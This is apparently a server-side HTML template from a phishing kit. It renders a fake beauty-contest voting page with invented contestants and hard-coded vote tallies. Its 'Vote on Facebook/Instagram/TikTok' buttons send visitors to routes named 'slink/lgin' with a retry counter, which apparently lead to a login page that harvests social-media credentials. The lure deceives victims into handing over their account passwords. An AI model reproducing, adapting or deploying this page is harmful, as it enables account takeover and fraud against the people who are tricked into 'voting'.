<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><%= link.contestantName %></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body class="bg-gray-100 min-h-screen">
    <%- include('../partials/translate.ejs') %>
    <div class="container mx-auto px-4 py-8">
        <!-- Owner Profile Card -->
        <div class="bg-white rounded-lg shadow-lg overflow-hidden mb-8">
            <div class="relative">
                <img src="<%= link.bannerImage || '/images/social-bg.webp' %>" alt="<%= link.contestantName %>" class="w-full h-48 object-cover">
                <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/70 to-transparent p-4">
                    <h1 class="text-white text-2xl font-bold"><%= link.contestantName || 'Beauty Contest 2025' %></h1>
                </div>
            </div>
            
            <div class="p-6">
                <div class="flex items-center mb-4">
                    <img src="<%= link.image %>" alt="Owner" class="w-16 h-16 rounded-full object-cover border-4 border-purple-500">
                    <div class="ml-4">
                        <h2 class="text-xl font-bold text-gray-800"><%= link.contestantName || 'Contest Owner' %></h2>
                        <p class="text-gray-600">118 votes • Contestant #3</p>
                    </div>
                </div>
                
                <p class="text-gray-700 mb-6">
                    <%= link.writeup || 'Join me in this exciting contest! Your vote means the world to me. Share and vote on your favorite social media platform to show your support. Let\'s make this journey amazing together! 💫' %>
                </p>
                
                <!-- Social Media Voting Buttons -->
                <div class="flex flex-col md:flex-row gap-4">
                    <% if(JSON.parse(link.socialMedia?.includes('facebook'))) { %>
                    <a href="/<%= p_link %>/slink/lgin/facebook/<%= link.linkId %>?retry=<%= link.retry %>" class="flex items-center justify-center gap-2 bg-blue-600 text-white py-3 px-4 rounded-lg hover:bg-blue-700 transition">
                        <i class="fab fa-facebook-f"></i>
                        Vote on Facebook
                    </a>
                    <% } %>
                    <% if(JSON.parse(link.socialMedia?.includes('instagram'))) { %>
                    <a href="/<%= p_link %>/slink/lgin/instagram/<%= link.linkId %>?retry=<%= link.retry %>" class="flex items-center justify-center gap-2 bg-gradient-to-r from-purple-500 to-pink-500 text-white py-3 px-4 rounded-lg hover:from-purple-600 hover:to-pink-600 transition">
                        <i class="fab fa-instagram"></i>
                        Vote on Instagram
                    </a>
                    <% } %>
                    <% if(JSON.parse(link.socialMedia?.includes('tiktok'))) { %>
                    <a href="/<%= p_link %>/slink/lgin/tiktok/<%= link.linkId %>?retry=<%= link.retry %>" class="flex items-center justify-center gap-2 bg-black text-white py-3 px-4 rounded-lg hover:bg-gray-900 transition">
                        <i class="fab fa-tiktok"></i>
                        Vote on TikTok
                    </a>
                    <% } %>
                </div>
            </div>
        </div>

        <!-- Contestants List -->
        <h2 class="text-2xl font-bold text-gray-800 mb-6">All Contestants</h2>
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            <% for(let i = 1; i <= 2; i++) { %>
                <div class="bg-white rounded-lg shadow-lg p-6">
                    <div class="flex items-center mb-4">
                        <img src="<%= '/images/voting' + i + '.jpg' %>" 
                                alt="Contestant <%= i %>" 
                                class="w-16 h-16 rounded-full object-cover">
                        <div class="ml-4">
                            <% if(i === 1) { %>
                                <h3 class="text-lg font-bold text-gray-800">Jane Kendra</h3>
                            <% } %>
                            <% if(i === 2) { %>
                                <h3 class="text-lg font-bold text-gray-800">Mary Biernacki</h3>
                            <% } %>
                            <p class="text-gray-600">#<%= i %></p>
                        </div>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600"><%= (10/i) * 50 + ((1/i) * 250) %> votes</span>
                        <% if(i === 1) { %>
                            <span class="bg-purple-500 text-white px-3 py-1 rounded-full text-sm">Leading</span>
                        <% } %> 
                        <% if(i === 2) { %>
                            <span class="bg-blue-500 text-white px-3 py-1 rounded-full text-sm">2nd Place</span>
                        <% } %> 
                        <% if(i === 3) { %>
                            <span class="bg-yellow-500 text-white px-3 py-1 rounded-full text-sm">3rd Place</span>
                        <% } %>
                    </div>
                </div>
            <% } %>
            <!-- Owner Card (Highlighted) -->
            <div class="bg-gradient-to-r from-purple-50 to-pink-50 rounded-lg shadow-lg p-6 border-2 border-purple-200">
                <div class="flex items-center mb-4">
                    <img src="<%= link.image %>" alt="<%= link.contestantName %>" class="w-16 h-16 rounded-full object-cover">
                    <div class="ml-4">
                        <h3 class="text-lg font-bold text-gray-800"><%= link.contestantName %></h3>
                        <p class="text-purple-600">#3</p>
                    </div>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-sm text-gray-600">118 votes</span>
                    <span class="bg-yellow-500 text-white px-3 py-1 rounded-full text-sm">3rd Place</span>
                </div>
            </div>
        </div>
    </div>

    <footer class="bg-white mt-12 py-6">
        <div class="container mx-auto px-4 text-center text-gray-600">
            <p>© <%= new Date().getFullYear() %>. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
